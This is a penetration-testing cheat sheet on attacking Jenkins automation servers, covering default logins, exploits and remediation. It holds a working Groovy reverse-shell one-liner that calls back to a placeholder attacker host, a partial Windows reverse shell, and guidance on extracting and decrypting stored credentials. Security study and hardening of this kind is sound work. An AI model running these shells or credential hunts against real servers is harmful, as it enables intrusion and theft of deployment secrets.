
# Jenkins - Automation Server Exploitation

## 🧠 Overview

Jenkins is the leading open-source automation server. Because it is designed to automate builds, tests, and deployments, it has extensive permissions to interact with the underlying operating system and the rest of the network.

➡️ **The Risk:** If an attacker gains access to the Jenkins dashboard (often via default credentials like `admin:admin`), they can use the built-in **Groovy Script Console** to execute arbitrary commands with the privileges of the Jenkins service (often `SYSTEM` on Windows or `jenkins/root` on Linux).

---

## 🔍 Discovery & Enumeration

### 🧪 Identification

* **Default Ports:** `8080` (HTTP), `8181`, or `8443` (HTTPS).
* **Slave Port:** Port `50000` (used for agent/slave communication via JNLP).
* **Fingerprint:** The web interface is highly recognizable, featuring the "Jenkins" logo and a list of build jobs.

### 🧪 Default Access

* **Anonymous Access:** Older versions or misconfigured instances allow anyone to view jobs or even manage the server without logging in.
* **Weak Credentials:** Check for `admin:admin`, `admin:password`, or `jenkins:jenkins`.

---

## 💥 The "Script Console" Attack (Authenticated RCE)

The **Script Console** (`/script`) is a feature that allows administrators to run Groovy scripts for troubleshooting. For a pentester, this is a direct path to a Reverse Shell.

### 🚀 Linux Reverse Shell (Groovy)

This script opens a socket and pipes it directly to a bash process.

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKER_IP/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

```

### 🚀 Windows Reverse Shell (Groovy)

On Windows, Jenkins often runs as `NT AUTHORITY\SYSTEM`. You can execute a PowerShell-based reverse shell or use the following Groovy logic:

```groovy
String host="ATTACKER_IP";
int port=8443;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
// ... Data streams handling logic ...

```

---

## 🔥 Pre-Authenticated RCE & Sandbox Bypass

When the dashboard is protected, we look for vulnerabilities in how Jenkins handles scripts or jobs.

| CVE | Vulnerability Type | Impact |
| --- | --- | --- |
| **CVE-2018-1999002** | Arbitrary File Read | Exfiltrate `credentials.xml` or `master.key`. |
| **CVE-2019-1003000** | Sandbox Bypass | **Pre-Auth RCE** by chaining with file read. |
| **CVE-2024-23897** | Arbitrary File Read | (Recent) Reading files via the CLI interface. |

---

## 🔑 Post-Exploitation: Hunting for Secrets

Jenkins is a treasure trove of credentials. After gaining access, look for:

* **`credentials.xml`**: Contains encrypted passwords, SSH keys, and API tokens used for deployments.
* **`secrets/master.key`** & **`secrets/hudson.util.Secret`**: Used to decrypt the passwords found in `credentials.xml`.

---

## 🛡️ Defensive Measures (Remediation)

1. **Disable the Script Console:** If not needed, or strictly limit access via Role-Based Access Control (RBAC).
2. **Enforce MFA:** Protect the dashboard with Multi-Factor Authentication.
3. **Principle of Least Privilege:** **Never** run Jenkins as `root` or `SYSTEM`. Run it as a dedicated service user with restricted permissions.
4. **Network Isolation:** Ensure Jenkins is only accessible via a VPN or an internal management VLAN.

---

## 💣 Pentester Mindset

* **Check the "Build History":** Look at old build logs. Developers often accidentally print API keys, passwords, or internal IP addresses in the console output.
* **Slave Manipulation:** If you can't run code on the Master, try to create a new "Node" (Slave) pointing to your own machine or a compromised host to execute jobs there.
* **Plugin Fuzzing:** Jenkins' security is only as strong as its weakest plugin. Vulnerabilities in popular plugins (like Git, Docker, or NodeJS) are very common.
